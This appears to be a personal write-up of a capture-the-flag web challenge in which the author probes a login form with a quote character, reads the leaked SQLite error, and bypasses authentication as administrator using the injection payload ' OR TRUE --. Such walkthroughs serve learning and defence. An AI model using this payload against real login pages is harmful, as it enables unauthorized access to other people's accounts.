* Challenge Description: Log in with the administrator's user account * 

I'm looking at the challenge description and at the OWASP vulnerability category which gets me thinking....injection....Administration account access....I need to "hack" the login portal. 

The next thing I thought was what I thought whenever coding injection came into my mind, which my brain answered: SQL
*SQL uses specific words in all capitalized letters including SELECT, AND, OR *

I went to the login screen and put a random symbol (') as the username and an easy number as the password ("0000") to observe what would happen in the debugger tool. 
I went to the debugger tool and navigated to the Network section where I got the following message after hitting enter on the login submission:

{
  "message": "SQLITE_ERROR: unrecognized token: \"4a7d1ed414474e4033ac29ccb8653d9b\"",
  "stack": "Error\n    at Database.<anonymous> (/app/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    at /app/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50\n    at new Promise (<anonymous>)\n    at Query.run (/app/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)\n    at /app/node_modules/sequelize/lib/sequelize.js:315:28\n    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)",
  "name": "SequelizeDatabaseError",
  "parent": {
    "errno": 1,
    "code": "SQLITE_ERROR",
    "sql": "SELECT * FROM Users WHERE email = ''' AND password = '4a7d1ed414474e4033ac29ccb8653d9b' AND deletedAt IS NULL"
  },
  "original": {
    "errno": 1,
    "code": "SQLITE_ERROR",
    "sql": "SELECT * FROM Users WHERE email = ''' AND password = '4a7d1ed414474e4033ac29ccb8653d9b' AND deletedAt IS NULL"
  },
  "sql": "SELECT * FROM Users WHERE email = ''' AND password = '4a7d1ed414474e4033ac29ccb8653d9b' AND deletedAt IS NULL",
  "parameters": {}
}

This result confirms that I will be conducting an SQL injection. Now let's get to doing the injection. :)

For the login, I entered  ' OR TRUE -- as the username and any string, which in this case I put "hello", as the password. BOOM we were logged in as the admin.
